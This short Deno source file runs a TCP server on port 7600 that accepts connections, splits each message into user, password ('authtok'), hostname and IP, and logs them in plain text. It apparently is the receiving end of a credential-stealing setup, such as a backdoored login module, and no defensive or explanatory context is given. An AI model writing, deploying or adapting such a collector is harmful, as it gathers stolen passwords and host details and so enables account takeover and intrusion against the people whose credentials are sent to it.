const PORT = 7600;
const REQUEST_LENGTH = 512;

const listener = Deno.listen({ port: PORT });
const decoder = new TextDecoder();

console.log(`listening on 0.0.0.0:${PORT}`);
for await (const conn of listener) {
    const buf = new Uint8Array(REQUEST_LENGTH);
    await conn.read(buf);

    const [user, authtok, hostname, ip] = decoder.decode(buf).split(",");
    console.log(
        `User: ${user} | Password: ${authtok} | Host: ${hostname} | IP: ${ip}`
    );

    conn.close();
}
